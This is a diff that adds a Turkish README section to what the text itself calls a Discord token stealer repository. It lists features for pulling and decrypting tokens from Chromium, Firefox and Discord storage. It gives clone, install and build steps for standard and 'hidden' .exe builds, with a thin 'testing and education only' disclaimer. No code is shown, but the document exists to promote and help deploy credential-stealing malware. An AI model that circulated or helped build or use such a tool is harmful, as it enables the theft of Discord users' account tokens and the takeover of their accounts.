@@ -37,3 +37,55 @@ Review the config.json file and configure your local test environment. Write you
 Run build.bat. Can be built in 4 standard .exe formats and 5 hidden build modes
 
 Don't forget to add a star
+
+
+
+
+# Turkish Language R1yat Discord-Token-Stealer
+
+Yalnızca test ve eğitim amaçlı geliştirilmiştir. Nasıl kullanılacağı konusunda hiçbir sorumluluk kabul etmiyorum.
+Discord: r1yat
+
+## ✨ Özellikler
+
+- Chromium ve Firefox desteği
+- Tarayıcı depolama analizi
+- AES-GCM ve DPAPI şifreleme araştırmaları
+- SQLite ve LevelDB analizi
+- Paralel işlem desteği
+- JSON tabanlı yapılandırma
+- Özel EXE derlemeleri
+- Yerel test ve raporlama
+- Yapılandırılabilir derleme seçenekleri
+- Discord ve Discord Canary güvenlik araştırmaları
+
+*Eğitim ve yetkili güvenlik araştırmaları için tasarlanmıştır.*
+
+## 🛠️ Kurulum
+
+**1. Depoyu klonlayın**
+
+```bash
+git clone https://github.com/r1yat/Discord-Token-Stealer
+cd Discord-Token-Stealer
+```
+
+**2. Gerekli bağımlılıkları yükleyin**
+
+```bash
+pip install -r requirements.txt
+```
+
+**3. Yapılandırma**
+
+<img src="https://i.imgur.com/2SQozMD.png" width="700">
+
+`config.json` dosyasını inceleyin ve yerel test ortamınıza göre yapılandırın.
+
+**4. Derleme**
+
+`build.bat` dosyasını çalıştırın. Standart EXE derlemeleri ve farklı test derleme modları arasından seçim yapabilirsiniz.
+
+---
+
+⭐ Projeyi beğendiyseniz yıldız vermeyi unutmayın!
